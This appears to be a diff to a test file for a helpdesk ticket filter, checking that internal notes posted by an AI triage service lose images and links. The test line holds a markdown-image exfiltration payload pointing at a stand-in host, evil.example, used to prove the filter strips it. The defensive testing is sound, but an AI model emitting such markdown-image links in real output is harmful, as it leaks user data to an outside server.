@@ -118,7 +118,7 @@ class TestTicketUntrustedFilter(HamsTransactionCase):
     def test_12_ai_note_loses_images_and_links(self):
         uid = self.env["zero_sudo.security.utils"]._get_service_uid("hams_helpdesk.user_ai_triage_service")
         ticket = self._ticket()
-        ticket.with_user(uid).mcp_post_internal_note("Draft ![x](https://evil.example/leak?d=1) https://evil.example/a")
+        ticket.with_user(uid).mcp_post_internal_note("Draft ![x](https://evil.example/leak?d=1) https://evil.example/a")  # burn-ignore: deliberate markdown-image exfil payload; the test proves the filter strips it
         body = ticket.message_ids[0].body
         self.assertNotIn("evil.example", body)
 
